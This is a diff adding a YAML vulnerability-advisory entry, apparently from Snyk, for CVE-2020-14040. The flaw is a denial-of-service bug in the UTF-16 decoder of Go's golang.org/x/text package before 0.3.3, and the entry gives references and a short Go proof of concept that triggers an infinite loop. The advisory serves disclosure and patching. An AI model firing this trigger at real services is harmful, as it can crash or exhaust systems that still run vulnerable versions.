@@ -1,0 +1,31 @@
+---
+- id: snykio:go:golang.org/x/text/encoding/unicode:609611
+  title: Denial of Service (DoS)
+  description: "[golang.org/x/text/encoding/unicode][1] is an unicode package provides\nUnicode
+    encodings such as UTF-16.\n\nAffected versions of this package are vulnerable
+    to Denial of Service\n(DoS). It is possible to exploit the UTF-16 decoder into
+    entering an\ninfinite loop, causing the program to crash or run out of memory.\n\n###
+    PoC   {#poc}\n\n    package main\n    \n    import (\n        \"fmt\"\n        \"golang.org/x/text/encoding/unicode\"\n
+    \   )\n    \n    func main() {\n        res, err := unicode.UTF16(unicode.BigEndian,
+    unicode.UseBOM).NewDecoder().String(\" \")\n        fmt.Println(res, err)\n    }\n\n\n\n[1]:
+    https://github.com/golang/text\n"
+  affected_package: golang.org/x/text/encoding/unicode
+  vulnerable_versions:
+  - "<0.3.3"
+  severity: high
+  package_manager: go
+  cve:
+  - CVE-2020-14040
+  cwe:
+  - CWE-400
+  disclosed_date: 2020-06-09
+  created_date: 2020-09-03
+  last_modified_date: 2020-09-03
+  credit:
+  - Evgeny Kapun
+  references:
+  - https://github.com/golang/go/issues/39491
+  - https://github.com/golang/text/commit/23ae387dee1f90d29a23c0e87ee0b46038fbed0e
+  - https://go-review.googlesource.com/c/text/+/238238
+  - https://groups.google.com/g/golang-announce/c/bXVeAmGOqz0
+  source_url: https://snyk.io/vuln/SNYK-GOLANG-GOLANGORGXTEXTENCODINGUNICODE-609611
